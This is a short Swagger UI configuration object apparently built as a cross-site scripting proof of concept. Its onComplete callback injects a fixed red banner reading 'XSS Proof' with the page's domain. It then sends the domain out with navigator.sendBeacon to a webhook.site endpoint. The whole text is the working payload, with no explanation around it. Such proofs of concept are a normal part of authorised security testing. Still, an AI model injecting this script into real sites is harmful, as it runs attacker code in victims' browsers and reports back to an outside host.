{
  "url": "https://petstore.swagger.io/v2/swagger.json",
  "onComplete": () => { 
    // Create invisible proof element
    const marker = document.createElement('div');
    marker.id = 'xss-proof';
    marker.style = 'position:fixed;bottom:0;z-index:9999;background:red;color:white;padding:10px;';
    marker.textContent = 'XSS Proof: ' + document.domain;
    document.body.appendChild(marker);
    
    // Send beacon to webhook
    navigator.sendBeacon('https://webhook.site/your-unique-id', document.domain);
  }
}
